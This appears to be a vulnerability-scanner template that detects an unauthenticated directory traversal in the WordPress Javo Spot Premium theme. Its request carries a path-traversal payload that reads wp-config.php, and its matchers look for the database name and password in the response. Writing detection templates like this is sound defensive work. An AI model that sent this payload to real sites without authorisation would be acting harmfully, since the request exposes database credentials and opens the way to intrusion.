id: "wp-spot-premium-lfi"
name: "WordPress Javo Spot Premium Theme - Unauthenticated Directory Traversal"
severity: "high"
description: "WordPress Javo Spot Premium Theme `wp-config` was discovered via local file inclusion. This file is remotely accessible and its content available for reading."
tech:
  - "wordpress"
  - "php"
tags:
  - "wordpress"
  - "backup"
  - "wpscan"
  - "vuln"
reference: "https://wpscan.com/vulnerability/2d465fc4-d4fa-43bb-9c0d-71dcc3ee4eab"
spaExclusion: true
request:
  method: "GET"
  path: "/wp-admin/admin-ajax.php?jvfrm_spot_get_json&fn=../../wp-config.php&callback=jQuery"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "DB_NAME"
      - "DB_PASSWORD"
    condition: "and"
  - type: "status"
    status:
      - 200
